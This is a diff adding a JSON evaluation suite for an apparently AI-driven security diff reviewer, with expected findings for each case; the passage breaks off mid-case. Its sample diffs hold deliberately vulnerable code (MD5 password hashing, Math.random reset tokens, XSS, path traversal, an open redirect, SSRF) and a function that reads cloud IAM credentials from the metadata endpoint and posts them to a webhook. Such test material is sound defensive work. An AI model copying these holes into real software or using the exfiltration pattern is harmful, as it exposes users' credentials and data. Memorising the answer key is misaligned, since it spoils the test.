@@ -1,0 +1,730 @@
+{
+  "fixed_before_eval": true,
+  "rubric": "Security-focused diff reviewer: actionable injection, unsafe execution, path traversal, SSRF, token security and unsafe redirects. UI keyboard behavior and database query efficiency are outside this rubric; dismissing them does not claim those findings are factually false.",
+  "agent_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+  "preflight_revision": "Before any eval inference, source 2660eaff-0365-42c0-afec-d889f7329fb3 returned 409 because its saved kind is lethal_trifecta, unsupported by the normal-finding converter. Replaced with real normal PR5 XSS finding f7ebabe0-49cb-4ddb-80bf-9de2598bcd9e. Initial selection is preserved separately. Final suite: 8 cases / 7 unique inputs.",
+  "total_cases": 8,
+  "unique_inputs": 7,
+  "cases": [
+    {
+      "id": "80a68a83-19f4-4b6c-81b1-e5220c74d155",
+      "owner_kind": "agent",
+      "owner_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+      "name": "Generate reset tokens with cryptographic randomness",
+      "input_diff": "diff --git a/security-demo/crypto.ts b/security-demo/crypto.ts\nnew file mode 100644\nindex 0000000..ede5878\n--- /dev/null\n+++ b/security-demo/crypto.ts\n@@ -0,0 +1,9 @@\n+import { createHash } from \"node:crypto\";\n+\n+export function hashPassword(password: string): string {\n+  return createHash(\"md5\").update(password).digest(\"hex\");\n+}\n+\n+export function resetToken(): string {\n+  return Math.random().toString(36).slice(2);\n+}\n",
+      "input_files": [
+        {
+          "path": "security-demo/crypto.ts",
+          "additions": 9,
+          "deletions": 0,
+          "hunks": [
+            {
+              "file": "security-demo/crypto.ts",
+              "oldStart": 0,
+              "oldLines": 0,
+              "newStart": 1,
+              "newLines": 9,
+              "newLineNumbers": [
+                1,
+                2,
+                3,
+                4,
+                5,
+                6,
+                7,
+                8,
+                9
+              ]
+            }
+          ]
+        }
+      ],
+      "input_meta": {
+        "version": 1,
+        "profile": "diff-only-v1",
+        "pr_title": null,
+        "pr_description": null,
+        "input_digest": "7e722cdc9310c1c9e903d187cc1ceba3eae0bcf12377e94e6faefbc62e3dbca4",
+        "source": {
+          "workspace_id": "45beacc7-21a0-49d8-a65a-b8bdae20f6a3",
+          "repo_id": "7b59db39-cd55-4c11-8690-faf47a579983",
+          "pr_id": "f8270626-c6c6-4d4b-9a65-efddce401110",
+          "pr_number": 5,
+          "review_id": "d299e884-a108-4c51-8906-ba507f225ce0",
+          "run_id": "064b7dee-e376-4278-84b6-8010197749c6",
+          "finding_id": "7e26e870-a6f4-4276-b477-924fc7c7547e",
+          "agent_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+          "decision": "accepted",
+          "decision_at": "2026-10-13T08:09:33.992Z",
+          "source_head_sha": null,
+          "diff_digest": "9632b7f2c0be08778911be36c3d8f8e01396f493bb8d889ac5ca793e47cc1715",
+          "retrieval": "trace-diff-block"
+        }
+      },
+      "expected_output": {
+        "kind": "must_find",
+        "file": "security-demo/crypto.ts",
+        "start_line": 7,
+        "end_line": 8
+      },
+      "notes": "Security rubric: Math.random is unsuitable for password-reset tokens. Actual L01 Codex finding from PR5.",
+      "created_at": "2026-10-13T08:09:34.022Z"
+    },
+    {
+      "id": "ca000ec4-c336-47fa-8666-9fdfffd01a64",
+      "owner_kind": "agent",
+      "owner_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+      "name": "Restrict outbound preview requests",
+      "input_diff": "diff --git a/security-demo/ssrf.ts b/security-demo/ssrf.ts\nnew file mode 100644\nindex 0000000..4fae78e\n--- /dev/null\n+++ b/security-demo/ssrf.ts\n@@ -0,0 +1,11 @@\n+export async function fetchPreview(userUrl: string): Promise<string> {\n+  const res = await fetch(userUrl);\n+  return res.text();\n+}\n+\n+export async function reportMetadata(webhook: string): Promise<void> {\n+  const creds = await (\n+    await fetch(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\n+  ).text();\n+  await fetch(webhook, { method: \"POST\", body: creds });\n+}\n",
+      "input_files": [
+        {
+          "path": "security-demo/ssrf.ts",
+          "additions": 11,
+          "deletions": 0,
+          "hunks": [
+            {
+              "file": "security-demo/ssrf.ts",
+              "oldStart": 0,
+              "oldLines": 0,
+              "newStart": 1,
+              "newLines": 11,
+              "newLineNumbers": [
+                1,
+                2,
+                3,
+                4,
+                5,
+                6,
+                7,
+                8,
+                9,
+                10,
+                11
+              ]
+            }
+          ]
+        }
+      ],
+      "input_meta": {
+        "version": 1,
+        "profile": "diff-only-v1",
+        "pr_title": null,
+        "pr_description": null,
+        "input_digest": "91716bfc2ab69827d6a9ea6346d1e027237d8aebf5449714e01f934310a5e0c2",
+        "source": {
+          "workspace_id": "45beacc7-21a0-49d8-a65a-b8bdae20f6a3",
+          "repo_id": "7b59db39-cd55-4c11-8690-faf47a579983",
+          "pr_id": "f8270626-c6c6-4d4b-9a65-efddce401110",
+          "pr_number": 5,
+          "review_id": "d299e884-a108-4c51-8906-ba507f225ce0",
+          "run_id": "064b7dee-e376-4278-84b6-8010197749c6",
+          "finding_id": "9ecdd1cd-4019-46eb-9bfd-a2e69cda89cb",
+          "agent_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+          "decision": "accepted",
+          "decision_at": "2026-10-13T08:09:34.038Z",
+          "source_head_sha": null,
+          "diff_digest": "6f4f5b9dec3d2ac818ab8d479ccdcced7f9868268245796a466780dccdb2013c",
+          "retrieval": "trace-diff-block"
+        }
+      },
+      "expected_output": {
+        "kind": "must_find",
+        "file": "security-demo/ssrf.ts",
+        "start_line": 1,
+        "end_line": 3
+      },
+      "notes": "Security rubric: caller-controlled preview URL creates SSRF exposure. Actual L01 Codex finding from PR5.",
+      "created_at": "2026-10-13T08:09:34.052Z"
+    },
+    {
+      "id": "4ed1b7d7-5a68-4037-a8fe-38f69fb3ee77",
+      "owner_kind": "agent",
+      "owner_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+      "name": "Escape or sanitize comment content before rendering",
+      "input_diff": "diff --git a/security-demo/render.tsx b/security-demo/render.tsx\nnew file mode 100644\nindex 0000000..f1dac69\n--- /dev/null\n+++ b/security-demo/render.tsx\n@@ -0,0 +1,9 @@\n+import React from \"react\";\n+\n+export function Comment({ comment }: { comment: string }) {\n+  return <div dangerouslySetInnerHTML={{ __html: comment }} />;\n+}\n+\n+export function highlight(term: string): string {\n+  return `<mark>${term}</mark>`;\n+}\n",
+      "input_files": [
+        {
+          "path": "security-demo/render.tsx",
+          "additions": 9,
+          "deletions": 0,
+          "hunks": [
+            {
+              "file": "security-demo/render.tsx",
+              "oldStart": 0,
+              "oldLines": 0,
+              "newStart": 1,
+              "newLines": 9,
+              "newLineNumbers": [
+                1,
+                2,
+                3,
+                4,
+                5,
+                6,
+                7,
+                8,
+                9
+              ]
+            }
+          ]
+        }
+      ],
+      "input_meta": {
+        "version": 1,
+        "profile": "diff-only-v1",
+        "pr_title": null,
+        "pr_description": null,
+        "input_digest": "b873ee70eee1326cbcc1f888d1d638ac4adcefda13b5cabb46921299dfe80884",
+        "source": {
+          "workspace_id": "45beacc7-21a0-49d8-a65a-b8bdae20f6a3",
+          "repo_id": "7b59db39-cd55-4c11-8690-faf47a579983",
+          "pr_id": "f8270626-c6c6-4d4b-9a65-efddce401110",
+          "pr_number": 5,
+          "review_id": "d299e884-a108-4c51-8906-ba507f225ce0",
+          "run_id": "064b7dee-e376-4278-84b6-8010197749c6",
+          "finding_id": "f7ebabe0-49cb-4ddb-80bf-9de2598bcd9e",
+          "agent_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+          "decision": "accepted",
+          "decision_at": "2026-10-13T08:12:00.724Z",
+          "source_head_sha": null,
+          "diff_digest": "adb3697f8923cab48fe29a74fce2d62ee31e1b51536703bafe74720b9b0fd8e3",
+          "retrieval": "trace-diff-block"
+        }
+      },
+      "expected_output": {
+        "kind": "must_find",
+        "file": "security-demo/render.tsx",
+        "start_line": 3,
+        "end_line": 4
+      },
+      "notes": "Security rubric: unsanitized caller-supplied comment HTML permits cross-site scripting. Actual normal L01 Codex finding from PR5; selected before inference after the unsupported lethal_trifecta source was excluded.",
+      "created_at": "2026-10-13T08:12:00.743Z"
+    },
+    {
+      "id": "474c3cb7-38aa-4ed7-93f3-5a5650dc3dbd",
+      "owner_kind": "agent",
+      "owner_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+      "name": "Confine upload reads to the upload directory",
+      "input_diff": "diff --git a/security-demo/files.ts b/security-demo/files.ts\nnew file mode 100644\nindex 0000000..3c29cd0\n--- /dev/null\n+++ b/security-demo/files.ts\n@@ -0,0 +1,8 @@\n+import { readFileSync } from \"node:fs\";\n+import { join } from \"node:path\";\n+\n+const UPLOAD_DIR = \"/var/app/uploads\";\n+\n+export function readUpload(name: string): string {\n+  return readFileSync(join(UPLOAD_DIR, name), \"utf8\");\n+}\n",
+      "input_files": [
+        {
+          "path": "security-demo/files.ts",
+          "additions": 8,
+          "deletions": 0,
+          "hunks": [
+            {
+              "file": "security-demo/files.ts",
+              "oldStart": 0,
+              "oldLines": 0,
+              "newStart": 1,
+              "newLines": 8,
+              "newLineNumbers": [
+                1,
+                2,
+                3,
+                4,
+                5,
+                6,
+                7,
+                8
+              ]
+            }
+          ]
+        }
+      ],
+      "input_meta": {
+        "version": 1,
+        "profile": "diff-only-v1",
+        "pr_title": null,
+        "pr_description": null,
+        "input_digest": "e2dbb6b7161afc278f52b47c4a09222dc2fe4a5965bb488a09fb2f048b914687",
+        "source": {
+          "workspace_id": "45beacc7-21a0-49d8-a65a-b8bdae20f6a3",
+          "repo_id": "7b59db39-cd55-4c11-8690-faf47a579983",
+          "pr_id": "f8270626-c6c6-4d4b-9a65-efddce401110",
+          "pr_number": 5,
+          "review_id": "d299e884-a108-4c51-8906-ba507f225ce0",
+          "run_id": "064b7dee-e376-4278-84b6-8010197749c6",
+          "finding_id": "b8b7111f-2300-48d7-9f97-8012d032addc",
+          "agent_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+          "decision": "accepted",
+          "decision_at": "2026-10-13T08:12:00.760Z",
+          "source_head_sha": null,
+          "diff_digest": "3ca0687392620526a68cd272151ede634de4baed1e689b1a6407ec032c5a0658",
+          "retrieval": "trace-diff-block"
+        }
+      },
+      "expected_output": {
+        "kind": "must_find",
+        "file": "security-demo/files.ts",
+        "start_line": 6,
+        "end_line": 7
+      },
+      "notes": "Security rubric: untrusted upload names can escape the upload directory. Actual L01 Codex finding from PR5.",
+      "created_at": "2026-10-13T08:12:00.780Z"
+    },
+    {
+      "id": "5566b8c6-8969-4c7f-8857-7b222e6eec88",
+      "owner_kind": "agent",
+      "owner_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+      "name": "Validate the post-login redirect destination",
+      "input_diff": "diff --git a/security-demo/redirect.ts b/security-demo/redirect.ts\nnew file mode 100644\nindex 0000000..ef6e6fa\n--- /dev/null\n+++ b/security-demo/redirect.ts\n@@ -0,0 +1,7 @@\n+interface Res {\n+  redirect(url: string): void;\n+}\n+\n+export function loginRedirect(res: Res, next: string) {\n+  res.redirect(next);\n+}\n",
+      "input_files": [
+        {
+          "path": "security-demo/redirect.ts",
+          "additions": 7,
+          "deletions": 0,
+          "hunks": [
+            {
+              "file": "security-demo/redirect.ts",
+              "oldStart": 0,
+              "oldLines": 0,
+              "newStart": 1,
+              "newLines": 7,
+              "newLineNumbers": [
+                1,
+                2,
+                3,
+                4,
+                5,
+                6,
+                7
+              ]
+            }
+          ]
+        }
+      ],
+      "input_meta": {
+        "version": 1,
+        "profile": "diff-only-v1",
+        "pr_title": null,
+        "pr_description": null,
+        "input_digest": "86bd05da23a1480cd6fc3938c58a9ad6c24e1928cf28a7e2ad8354631009039e",
+        "source": {
+          "workspace_id": "45beacc7-21a0-49d8-a65a-b8bdae20f6a3",
+          "repo_id": "7b59db39-cd55-4c11-8690-faf47a579983",
+          "pr_id": "f8270626-c6c6-4d4b-9a65-efddce401110",
+          "pr_number": 5,
+          "review_id": "d299e884-a108-4c51-8906-ba507f225ce0",
+          "run_id": "064b7dee-e376-4278-84b6-8010197749c6",
+          "finding_id": "633e91bd-d36c-4945-b304-afec55865a39",
+          "agent_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+          "decision": "accepted",
+          "decision_at": "2026-10-13T08:12:00.799Z",
+          "source_head_sha": null,
+          "diff_digest": "d570802374715576c2e715ee4fae0f82b2ec2c5e81e9bc62f62ae8092a5e1a65",
+          "retrieval": "trace-diff-block"
+        }
+      },
+      "expected_output": {
+        "kind": "must_find",
+        "file": "security-demo/redirect.ts",
+        "start_line": 5,
+        "end_line": 6
+      },
+      "notes": "Security rubric: unchecked post-login redirect permits attacker-controlled destinations. Actual L01 Codex finding from PR5.",
+      "created_at": "2026-10-13T08:12:00.819Z"
+    },
+    {
+      "id": "9521c17a-79ed-425d-be2e-347449e6f5b4",
+      "owner_kind": "agent",
+      "owner_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+      "name": "Restrict the preview opener's keyboard handler to its anchor",
+      "input_diff": "diff --git a/client/src/components/FindingsHoverCard/FindingsHoverCard.tsx b/client/src/components/FindingsHoverCard/FindingsHoverCard.tsx\n--- a/client/src/components/FindingsHoverCard/FindingsHoverCard.tsx\n+++ b/client/src/components/FindingsHoverCard/FindingsHoverCard.tsx\n@@ -0,0 +1,184 @@\n+/* FindingsHoverCard — a dependency-free hover popover for findings teasers\n+   (PR list cell + Agent-runs timeline row).\n+\n+   The panel is rendered in a PORTAL to document.body with position:fixed, so it\n+   is never clipped by an ancestor's `overflow:hidden` (the PR-list table card\n+   has one). Position is measured from the anchor on open and recomputed on\n+   scroll/resize; it opens below the anchor and flips above when there isn't room.\n+\n+   - Opens on mouse-enter, closes on mouse-leave with a short delay. Because the\n+     panel lives outside the anchor's DOM subtree, both the anchor and the panel\n+     share the open/close timers so moving the pointer across the 6px gap keeps\n+     it open.\n+   - Closes on Escape and on scroll of an ancestor.\n+   - The popover is decoration over already-visible counts (the full, actionable\n+     list is the detail Findings panel), so it is aria-hidden. */\n+\"use client\";\n+\n+import React from \"react\";\n+import { createPortal } from \"react-dom\";\n+\n+const CLOSE_DELAY_MS = 120;\n+const GAP = 6;\n+const MAX_PANEL_H = 340; // matches the panel's max-height + header, for flip math\n+\n+type Coords = { left: number; top: number; placement: \"below\" | \"above\" };\n+\n+export function FindingsHoverCard({\n+  anchor,\n+  header,\n+  children,\n+  align = \"left\",\n+  width = 380,\n+}: {\n+  anchor: React.ReactNode;\n+  header: React.ReactNode;\n+  children: React.ReactNode;\n+  align?: \"left\" | \"right\";\n+  width?: number;\n+}) {\n+  const [open, setOpen] = React.useState(false);\n+  const [coords, setCoords] = React.useState<Coords | null>(null);\n+  const [mounted, setMounted] = React.useState(false);\n+  const anchorRef = React.useRef<HTMLSpanElement | null>(null);\n+  const panelRef = React.useRef<HTMLDivElement | null>(null);\n+  const closeTimer = React.useRef<ReturnType<typeof setTimeout> | null>(null);\n+\n+  React.useEffect(() => setMounted(true), []);\n+\n+  const cancelClose = React.useCallback(() => {\n+    if (closeTimer.current) {\n+      clearTimeout(closeTimer.current);\n+      closeTimer.current = null;\n+    }\n+  }, []);\n+  const scheduleClose = React.useCallback(() => {\n+    cancelClose();\n+    closeTimer.current = setTimeout(() => setOpen(false), CLOSE_DELAY_MS);\n+  }, [cancelClose]);\n+  React.useEffect(() => cancelClose, [cancelClose]);\n+\n+  const place = React.useCallback(() => {\n+    const el = anchorRef.current;\n+    if (!el) return;\n+    const r = el.getBoundingClientRect();\n+    const vw = window.innerWidth;\n+    const vh = window.innerHeight;\n+    const roomBelow = vh - r.bottom;\n+    const placement: Coords[\"placement\"] =\n+      roomBelow < MAX_PANEL_H && r.top > roomBelow ? \"above\" : \"below\";\n+    // Horizontal: align to the requested edge, then clamp into the viewport.\n+    let left = align === \"right\" ? r.right - width : r.left;\n+    left = Math.max(8, Math.min(left, vw - width - 8));\n+    const top = placement === \"below\" ? r.bottom + GAP : r.top - GAP;\n+    setCoords({ left, top, placement });\n+  }, [align, width]);\n+\n+  const handleOpen = React.useCallback(() => {\n+    cancelClose();\n+    place();\n+    setOpen(true);\n+  }, [cancelClose, place]);\n+\n+  // Reposition / dismiss while open.\n+  React.useEffect(() => {\n+    if (!open) return;\n+    const onKey = (e: KeyboardEvent) => {\n+      if (e.key === \"Escape\") setOpen(false);\n+    };\n+    // Close when the PAGE scrolls (the fixed panel would otherwise detach from\n+    // its anchor) — but NOT when the user scrolls inside the panel's own list.\n+    const onScroll = (e: Event) => {\n+      const target = e.target as Node | null;\n+      if (target && panelRef.current?.contains(target)) return;\n+      setOpen(false);\n+    };\n+    window.addEventListener(\"keydown\", onKey);\n+    window.addEventListener(\"scroll\", onScroll, true);\n+    window.addEventListener(\"resize\", place);\n+    return () => {\n+      window.removeEventListener(\"keydown\", onKey);\n+      window.removeEventListener(\"scroll\", onScroll, true);\n+      window.removeEventListener(\"resize\", place);\n+    };\n+  }, [open, place]);\n+\n+  const panel =\n+    open && coords ? (\n+      <div\n+        ref={panelRef}\n+        role=\"presentation\"\n+        aria-hidden\n+        onMouseEnter={cancelClose}\n+        onMouseLeave={scheduleClose}\n+        onClick={(e) => e.stopPropagation()}\n+        style={{\n+          position: \"fixed\",\n+          left: coords.left,\n+          top: coords.placement === \"below\" ? coords.top : undefined,\n+          bottom:\n+            coords.placement === \"above\" ? window.innerHeight - coords.top : undefined,\n+          width,\n+          maxWidth: \"92vw\",\n+          zIndex: 1000,\n+          background: \"var(--bg-elevated)\",\n+          border: \"1px solid var(--border)\",\n+          borderRadius: 10,\n+          boxShadow: \"0 12px 32px rgba(0,0,0,0.32)\",\n+          overflow: \"hidden\",\n+          textAlign: \"left\",\n+          cursor: \"default\",\n+        }}\n+      >\n+        <div\n+          style={{\n+            padding: \"8px 12px\",\n+            borderBottom: \"1px solid var(--border)\",\n+            fontSize: 11,\n+            fontWeight: 700,\n+            letterSpacing: \"0.06em\",\n+            textTransform: \"uppercase\",\n+            color: \"var(--text-muted)\",\n+          }}\n+        >\n+          {header}\n+        </div>\n+        <div\n+          style={{\n+            maxHeight: 320,\n+            overflowY: \"auto\",\n+            overflowX: \"hidden\",\n+            padding: 10,\n+            display: \"flex\",\n+            flexDirection: \"column\",\n+            gap: 8,\n+            boxSizing: \"border-box\",\n+          }}\n+        >\n+          {children}\n+        </div>\n+      </div>\n+    ) : null;\n+\n+  return (\n+    <span\n+      ref={anchorRef}\n+      tabIndex={0}\n+      role=\"button\"\n+      aria-label=\"Preview findings\"\n+      aria-expanded={open}\n+      style={{ display: \"inline-flex\" }}\n+      onMouseEnter={handleOpen}\n+      onMouseLeave={scheduleClose}\n+      onFocus={handleOpen}\n+      onBlur={scheduleClose}\n+      onClick={(e) => { e.stopPropagation(); handleOpen(); }}\n+      onKeyDown={(e) => {\n+        if (e.key === \"Enter\" || e.key === \" \") { e.preventDefault(); handleOpen(); }\n+      }}\n+    >\n+      {anchor}\n+      {mounted && panel ? createPortal(panel, document.body) : null}\n+    </span>\n+  );\n+}\n",
+      "input_files": [
+        {
+          "path": "client/src/components/FindingsHoverCard/FindingsHoverCard.tsx",
+          "additions": 184,
+          "deletions": 0,
+          "hunks": [
+            {
+              "file": "client/src/components/FindingsHoverCard/FindingsHoverCard.tsx",
+              "oldStart": 0,
+              "oldLines": 0,
+              "newStart": 1,
+              "newLines": 184,
+              "newLineNumbers": [
+                1,
+                2,
+                3,
+                4,
+                5,
+                6,
+                7,
+                8,
+                9,
+                10,
+                11,
+                12,
+                13,
+                14,
+                15,
+                16,
+                17,
+                18,
+                19,
+                20,
+                21,
+                22,
+                23,
+                24,
+                25,
+                26,
+                27,
+                28,
+                29,
+                30,
+                31,
+                32,
+                33,
+                34,
+                35,
+                36,
+                37,
+                38,
+                39,
+                40,
+                41,
+                42,
+                43,
+                44,
+                45,
+                46,
+                47,
+                48,
+                49,
+                50,
+                51,
+                52,
+                53,
+                54,
+                55,
+                56,
+                57,
+                58,
+                59,
+                60,
+                61,
+                62,
+                63,
+                64,
+                65,
+                66,
+                67,
+                68,
+                69,
+                70,
+                71,
+                72,
+                73,
+                74,
+                75,
+                76,
+                77,
+                78,
+                79,
+                80,
+                81,
+                82,
+                83,
+                84,
+                85,
+                86,
+                87,
+                88,
+                89,
+                90,
+                91,
+                92,
+                93,
+                94,
+                95,
+                96,
+                97,
+                98,
+                99,
+                100,
+                101,
+                102,
+                103,
+                104,
+                105,
+                106,
+                107,
+                108,
+                109,
+                110,
+                111,
+                112,
+                113,
+                114,
+                115,
+                116,
+                117,
+                118,
+                119,
+                120,
+                121,
+                122,
+                123,
+                124,
+                125,
+                126,
+                127,
+                128,
+                129,
+                130,
+                131,
+                132,
+                133,
+                134,
+                135,
+                136,
+                137,
+                138,
+                139,
+                140,
+                141,
+                142,
+                143,
+                144,
+                145,
+                146,
+                147,
+                148,
+                149,
+                150,
+                151,
+                152,
+                153,
+                154,
+                155,
+                156,
+                157,
+                158,
+                159,
+                160,
+                161,
+                162,
+                163,
+                164,
+                165,
+                166,
+                167,
+                168,
+                169,
+                170,
+                171,
+                172,
+                173,
+                174,
+                175,
+                176,
+                177,
+                178,
+                179,
+                180,
+                181,
+                182,
+                183,
+                184
+              ]
+            }
+          ]
+        }
+      ],
+      "input_meta": {
+        "version": 1,
+        "profile": "diff-only-v1",
+        "pr_title": null,
+        "pr_description": "Each expanded review run now has visible Critical/Warning/Suggestion count pills and three independent filter buttons. Selecting a severity affects that run; selecting it again restores its findings. Counts follow the rendered cards, including confidence filtering, and filtering makes no model request.\r\n\r\nSuccessful-run cost is persisted and shown in the PR-list total, Timeline and Trace Stats. Missing prices remain unknown. The PR-list FINDINGS preview shows the latest run with no mutation controls; detail cards keep Accept and Reject. Every package has substantive docs/specs and linked Read When guides. Windows bootstrap and fixture-path fixes are included.\r\n\r\nValidation: client typecheck and 42 tests; server typecheck and 103 unit tests; local migration 0010 applied; browser checks for filtering, repeat-click reset, empty results and the findings preview. Four hover tests passed again after keyboard/click support. DB integration and the separate e2e runner were not run.\r\n\r\n[Updated UI demo](https://github.com/imaxxer121/dev-digest/blob/feat/l01-severity-findings/docs/assets/l01-severity-demo.mp4) · [Validation notes](https://github.com/imaxxer121/dev-digest/blob/feat/l01-severity-findings/docs/l01-demo.md)\r\n\r\nThe video shows the starter seeded PR #482. A separate actual Codex CLI inference, using ChatGPT login without an API key, found a response-field rename in a supplied coursework diff. It is separate from this UI fixture; Claude Code was not used. Cost/preview scaffolding is adapted from the official MIT lesson commits c0a913b and db72302, with per-run filtering and all-successful-run cost semantics adjusted to the homework rubric.\r\n\r\nhttps://github.com/user-attachments/assets/093f87c1-94eb-4ce8-ae58-d0502427d287\r\n\r\n",
+        "input_digest": "fdfb210553202b588262718395c990f79af06f55b3771ecb22703674218b827f",
+        "source": {
+          "workspace_id": "45beacc7-21a0-49d8-a65a-b8bdae20f6a3",
+          "repo_id": "7b59db39-cd55-4c11-8690-faf47a579983",
+          "pr_id": "05bc15c7-07a0-4274-8a03-c8d31d611693",
+          "pr_number": 1,
+          "review_id": "b341444e-64b5-476d-88d2-cd7ae5f58783",
+          "run_id": "08533900-2526-4a0c-92f8-6ddb73b34bfa",
+          "finding_id": "bd5a4bf6-bd23-4160-9150-8b6cc596ef69",
+          "agent_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+          "decision": "dismissed",
+          "decision_at": "2026-10-13T08:12:00.830Z",
+          "source_head_sha": null,
+          "diff_digest": "5413466c29bb4694e41ac4e9f6ba0dc5ad679ef8c1844caf86683bf27cd40e29",
+          "retrieval": "trace-diff-block"
+        }
+      },
+      "expected_output": {
+        "kind": "must_not_flag",
+        "file": "client/src/components/FindingsHoverCard/FindingsHoverCard.tsx",
+        "start_line": 176,
+        "end_line": 178
+      },
+      "notes": "This UI keyboard-bubbling issue may be valid, but is outside the security-focused evaluation rubric. Expected no finding at this UI-only location. Actual L01 Codex finding from PR1.",
+      "created_at": "2026-10-13T08:12:00.850Z"
+    },
+    {
+      "id": "f1741ce9-d28c-40c7-974d-08399113a044",
+      "owner_kind": "agent",
+      "owner_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+      "name": "Aggregate counts instead of querying each review individually",
+      "input_diff": "diff --git a/server/src/modules/pulls/routes.ts b/server/src/modules/pulls/routes.ts\nindex 95ab5b2..b3194d5 100644\n--- a/server/src/modules/pulls/routes.ts\n+++ b/server/src/modules/pulls/routes.ts\n@@ -321,4 +321,43 @@ export default async function pullsRoutes(appBase: FastifyInstance) {\n       }\n     },\n   );\n+\n+  // Activity summary for the repo overview: per-PR review + finding counts,\n+  // newest PR first. Powers the \"N reviews · M findings\" row on each pull\n+  // request in the repo dashboard.\n+  app.get('/repos/:id/activity', { schema: { params: IdParams } }, async (req) => {\n+    const { workspaceId } = await getContext(container, req);\n+    const [repo] = await container.db\n+      .select()\n+      .from(t.repos)\n+      .where(and(eq(t.repos.workspaceId, workspaceId), eq(t.repos.id, req.params.id)));\n+    if (!repo) throw new NotFoundError('Repo not found');\n+\n+    const prs = await container.db\n+      .select()\n+      .from(t.pullRequests)\n+      .where(eq(t.pullRequests.repoId, repo.id))\n+      .orderBy(desc(t.pullRequests.number));\n+\n+    const summary = [];\n+    for (const pr of prs) {\n+      const reviews = await container.db\n+        .select()\n+        .from(t.reviews)\n+        .where(eq(t.reviews.prId, pr.id));\n+\n+      let findings = 0;\n+      for (const review of reviews) {\n+        const rows = await container.db\n+          .select()\n+          .from(t.findings)\n+          .where(eq(t.findings.reviewId, review.id));\n+        findings += rows.length;\n+      }\n+\n+      summary.push({ number: pr.number, title: pr.title, reviews: reviews.length, findings });\n+    }\n+\n+    return summary;\n+  });\n }\n",
+      "input_files": [
+        {
+          "path": "server/src/modules/pulls/routes.ts",
+          "additions": 39,
+          "deletions": 0,
+          "hunks": [
+            {
+              "file": "server/src/modules/pulls/routes.ts",
+              "oldStart": 321,
+              "oldLines": 4,
+              "newStart": 321,
+              "newLines": 43,
+              "newLineNumbers": [
+                321,
+                322,
+                323,
+                324,
+                325,
+                326,
+                327,
+                328,
+                329,
+                330,
+                331,
+                332,
+                333,
+                334,
+                335,
+                336,
+                337,
+                338,
+                339,
+                340,
+                341,
+                342,
+                343,
+                344,
+                345,
+                346,
+                347,
+                348,
+                349,
+                350,
+                351,
+                352,
+                353,
+                354,
+                355,
+                356,
+                357,
+                358,
+                359,
+                360,
+                361,
+                362,
+                363
+              ]
+            }
+          ]
+        }
+      ],
+      "input_meta": {
+        "version": 1,
+        "profile": "diff-only-v1",
+        "pr_title": null,
+        "pr_description": null,
+        "input_digest": "f6ab2c720b98d9213b9a9fdb51fddef70abf474371969bf401270dd7f4e903e7",
+        "source": {
+          "workspace_id": "45beacc7-21a0-49d8-a65a-b8bdae20f6a3",
+          "repo_id": "7b59db39-cd55-4c11-8690-faf47a579983",
+          "pr_id": "39abc7e4-a283-4b98-9bde-0f85a7747c08",
+          "pr_number": 3,
+          "review_id": "2473caf1-3054-4b29-b6b1-ca52aa888141",
+          "run_id": "dd4db7e7-5158-4e17-953f-67b351be50da",
+          "finding_id": "3bfc8487-6ee8-4de0-89e2-d66fbf1d563a",
+          "agent_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+          "decision": "dismissed",
+          "decision_at": "2026-10-13T08:12:00.868Z",
+          "source_head_sha": null,
+          "diff_digest": "3ca996483bf2ca93abfa986676f6377a4699c9061d8c653432569ac0788d309b",
+          "retrieval": "trace-diff-block"
+        }
+      },
+      "expected_output": {
+        "kind": "must_not_flag",
+        "file": "server/src/modules/pulls/routes.ts",
+        "start_line": 350,
+        "end_line": 355
+      },
+      "notes": "This N+1 performance issue may be valid, but is outside the security-focused evaluation rubric. Expected no comment at the aggregation location. Actual L01 Codex finding from PR3.",
+      "created_at": "2026-10-13T08:12:00.888Z"
+    },
+    {
+      "id": "82af7877-4eba-4735-b8bb-35583850ac7e",
+      "owner_kind": "agent",
+      "owner_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+      "name": "Replace unsalted MD5 password hashing",
+      "input_diff": "diff --git a/security-demo/crypto.ts b/security-demo/crypto.ts\nnew file mode 100644\nindex 0000000..ede5878\n--- /dev/null\n+++ b/security-demo/crypto.ts\n@@ -0,0 +1,9 @@\n+import { createHash } from \"node:crypto\";\n+\n+export function hashPassword(password: string): string {\n+  return createHash(\"md5\").update(password).digest(\"hex\");\n+}\n+\n+export function resetToken(): string {\n+  return Math.random().toString(36).slice(2);\n+}\n",
+      "input_files": [
+        {
+          "path": "security-demo/crypto.ts",
+          "additions": 9,
+          "deletions": 0,
+          "hunks": [
+            {
+              "file": "security-demo/crypto.ts",
+              "oldStart": 0,
+              "oldLines": 0,
+              "newStart": 1,
+              "newLines": 9,
+              "newLineNumbers": [
+                1,
+                2,
+                3,
+                4,
+                5,
+                6,
+                7,
+                8,
+                9
+              ]
+            }
+          ]
+        }
+      ],
+      "input_meta": {
+        "version": 1,
+        "profile": "diff-only-v1",
+        "pr_title": null,
+        "pr_description": null,
+        "input_digest": "7e722cdc9310c1c9e903d187cc1ceba3eae0bcf12377e94e6faefbc62e3dbca4",
+        "source": {
+          "workspace_id": "45beacc7-21a0-49d8-a65a-b8bdae20f6a3",
+          "repo_id": "7b59db39-cd55-4c11-8690-faf47a579983",
+          "pr_id": "f8270626-c6c6-4d4b-9a65-efddce401110",
+          "pr_number": 5,
+          "review_id": "d299e884-a108-4c51-8906-ba507f225ce0",
+          "run_id": "064b7dee-e376-4278-84b6-8010197749c6",
+          "finding_id": "17e48be2-3093-430f-a409-41af1e5194da",
+          "agent_id": "ac7830a4-1f69-44c2-bac5-d3805070872a",
+          "decision": "accepted",
+          "decision_at": "2026-10-13T08:12:00.645Z",
+          "source_head_sha": null,
